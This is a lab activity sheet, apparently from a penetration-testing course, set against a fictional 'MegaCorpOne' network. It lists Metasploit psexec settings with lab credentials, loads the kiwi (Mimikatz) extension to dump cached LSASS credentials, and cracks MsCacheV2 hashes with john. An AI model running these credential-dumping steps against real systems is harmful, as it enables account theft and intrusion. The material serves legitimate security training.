## Activity File: Credential Dumping

In this activity, you'll continue to play the role of a pen tester conducting an engagement on MegaCorpOne. You are tasked to use the Metasploit `kiwi` extension to dump the credentials that are cached on the WIN10 machine. Then you will save and crack the hashes using `john`.

⚠️ **Reminder** - Don't forget to save your findings, as you will add them to your week 17 Homework!


### Instructions

First, open a Meterpreter session as SYSTEM on WIN10 by performing the following steps (if a current Meterpreter SYSTEM session isn't already opened).

1. Load the `psexec` module: `use exploit/windows/smb/psexec`

2. Set the following parameters:

	- `set RHOSTS 172.22.117.20`
	
	- `set SMBUSER tstark`
	
	- `set SMBPass Password!`
	
	- `set SMBDomain megacorpone`
	
	- `set LHOST 172.22.117.100`

3. Run the module with `run`.

4. In your Meterpreter session, load the `kiwi` extension:

     - `load kiwi`

5. Once a new extension is loaded into Metasploit, it will update the help menu. View the `kiwi` command options by calling the help menu in Meterpreter:

     - `?`

6. Dump all the cached credentials from LSASS using a `kiwi_cmd` command. Reference the [cheat sheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49) for Mimikatz. Pay attention to the "lsadump" section. 

     **Note:** If the `kiwi` command is not dumping credentials as expected, try migrating to another process using the `migrate` command. Keep in mind that you want to migrate to another SYSTEM x64 process.

7. In the output, the hashes are displayed after the "MsCacheV2 field." MsCacheV2 is just the format of the hash. Save the hashes in the format `username:password`, as shown.

	Using `john`, attempt to crack the password. Your `john` command should use the flag`--format=mscash2`, e.g., `john --format=mscash2 hashes.txt`.

8. You should now have the plain-text password to the new account of bbanner.
